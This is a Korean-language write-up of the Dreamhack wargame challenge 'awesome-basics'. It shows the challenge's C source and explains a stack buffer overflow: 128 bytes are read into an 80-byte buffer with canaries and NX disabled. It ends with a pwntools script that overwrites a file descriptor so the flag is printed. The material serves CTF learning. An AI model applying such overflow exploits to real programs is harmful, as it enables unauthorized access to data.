# awesome-basics

[문제 링크](https://dreamhack.io/wargame/challenges/835)

## 문제 분석

```c
// Name: chall.c
// Compile: gcc -zexecstack -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

#define FLAG_SIZE 0x45d

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

char *flag;

int main(int argc, char *argv[]) {
    int stdin_fd = 0;
    int stdout_fd = 1;
    int flag_fd;
    int tmp_fd;
    char buf[80];

    initialize();

    // read flag
    flag = (char *)malloc(FLAG_SIZE);
    flag_fd = open("./flag", O_RDONLY);
    read(flag_fd, flag, FLAG_SIZE);
    close(flag_fd);

    tmp_fd = open("./tmp/flag", O_WRONLY);

    write(stdout_fd, "Your Input: ", 12);
    read(stdin_fd, buf, 0x80);

    write(tmp_fd, flag, FLAG_SIZE);
    write(tmp_fd, buf, 80);
    close(tmp_fd);

    return 0;
}
```

## 취약점 분석

### 스택 버퍼 오버플로우 (Stack Buffer Overflow)

저장을 하는 버퍼 : `char buf[80];` (80바이트)

실제 입력을 받는 사이즈 : `read(stdin_fd, buf, 0x80);` (128바이트)

80바이트를 저장할 수 있지만 실제로 128바이트까지 입력을 받으니 48바이트를 오버 플로우를 시킬 수 있다.

### 컴파일 옵션

`-zexecstack` : NX 비활성화

`-fno-stack-protector` : 카나리 비활성화

이 옵션을 통해 스택 오버플로우를 이용해 공격이 가능하다.

## 익스플로잇 구상

스택저장 방식에 따라서 buf가 저장되어 있는 주소 바로 위 주소에 tmp_fd가 저장된다. 

그래서 buf의 저장 범위를 넘어서 저장하면 그 값은 tmp_fd에 저장되게 된다.

이를 이용하여 tmp_fd에 1을 넣게 된다면 모니터에 플래그를 출력하게 될 것이다.



## 익스플로잇 코드

```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./chall')

payload = b'A' * 80
payload += p32(1)

p.sendafter(b"Your Input: ", payload)

result = p.recvall(timeout=3).decode('utf-8', 'ignore')
print(result)
```

이를 통해 플래그를 얻어 낼 수 있다.